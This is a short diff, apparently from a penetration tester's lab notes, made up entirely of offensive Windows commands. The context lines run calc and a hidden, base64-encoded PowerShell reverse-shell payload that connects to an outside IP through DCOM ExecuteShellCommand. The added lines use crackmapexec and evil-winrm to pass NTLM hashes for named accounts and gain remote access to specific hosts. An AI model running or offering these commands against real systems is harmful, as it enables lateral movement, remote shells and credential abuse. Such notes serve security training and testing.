@@ -67,3 +67,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```
+
+
+crackmapexec smb 10.10.132.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+evil-winrm -i 192.168.250.153 -u mary.williams -H 9a3121977ee93af56ebd0ef4f527a35e
